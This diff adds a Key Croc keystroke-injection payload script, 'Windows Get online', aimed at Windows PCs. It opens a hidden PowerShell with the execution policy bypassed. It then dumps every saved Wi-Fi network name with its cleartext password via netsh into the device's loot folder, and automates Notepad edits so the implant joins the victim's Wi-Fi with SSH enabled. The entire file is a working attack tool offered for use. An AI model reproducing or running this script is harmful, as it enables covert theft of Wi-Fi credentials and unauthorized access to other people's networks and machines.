@@ -1,0 +1,114 @@
+# Title:         Windows Get online   
+# Description:   Get online automatically to target pc wifi or to your own wifi
+# Author:        spywill
+# Version:       1.5
+# Category:      Key Croc
+# Props:         Darren Kitchen, RootJunky, Cribbit, Lodrix
+#
+#
+MATCH getonline
+Q LOCK
+# --> Edit config.txt
+LED SETUP
+# --> Remone any existing WIFI setting
+Q STRING "$(sed -i -e '/^[WS]/d' /root/udisk/config.txt)"
+Q ENTER
+sleep 1
+# --> Edit config.txt with sed
+Q STRING "$(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt)"
+Q ENTER
+sleep 0.5
+# --> udisk unmount
+ATTACKMODE HID STORAGE
+sleep 5
+Q GUI r
+sleep 0.5
+# --> Open powershell
+Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
+Q ENTER
+sleep 0.5
+# --> Get KeyCroc drive
+LED ATTACK
+Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+Q ENTER
+sleep 1
+# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
+Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table | Out-File -encoding ASCII \"\$Croc\loot\wifipass.txt\""
+Q ENTER
+sleep 1
+# --> Open notepad with the KeyCroc config.txt
+Q STRING "notepad \$Croc\config.txt"
+Q ENTER
+sleep 1
+Q GUI r
+Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
+Q ENTER
+sleep 1
+Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+Q ENTER
+sleep 1
+LED SETUP
+# --> Open wifipass.txt to copy and paste the SSID and PASSWD
+Q STRING "notepad \$Croc\loot\wifipass.txt"
+Q ENTER
+sleep 1
+# --> Copy and paste the SSID AND PASSWD to the config.txt
+Q CONTROL-g
+sleep 0.5
+Q STRING "4"
+Q ENTER
+Q CONTROL-RIGHTARROW
+Q CONTROL-RIGHTARROW
+# --> Select the hole line
+Q CONTROL-SHIFT-LEFTARROW
+# --> Copy
+Q CONTROL-c
+sleep 0.5
+# --> Change windows
+Q CONTROL-ALT-TAB
+Q ENTER
+sleep 0.5
+# --> select line to edit
+Q CONTROL-g
+s 0.5
+Q STRING "11"
+Q ENTER
+sleep 0.5
+Q CONTROL-RIGHTARROW
+# --> SPACEBAR is 00,00,2c
+Q KEYCODE 00,00,2c
+# --> Paste
+Q CONTROL-v
+sleep 0.5
+Q CONTROL-ALT-TAB
+sleep 0.5
+Q ENTER
+Q CONTROL-g
+sleep 0.5
+Q STRING "4"
+Q ENTER
+Q CONTROL-RIGHTARROW
+Q LEFTARROW
+Q CONTROL-SHIFT-LEFTARROW
+Q CONTROL-c
+Q CONTROL-ALT-TAB
+sleep 0.5
+Q ENTER
+Q CONTROL-g
+sleep 0.5
+Q STRING "10"
+Q ENTER
+Q CONTROL-RIGHTARROW
+Q KEYCODE 00,00,2c
+Q CONTROL-v
+sleep 0.5
+# --> Save config.txt
+Q CONTROL w
+Q ENTER
+sleep 0.5
+Q CONTROL-ALT-TAB
+Q DELETE
+# --> Returning to HID Mode
+ATTACKMODE HID
+Q UNLOCK
+LED FINISH
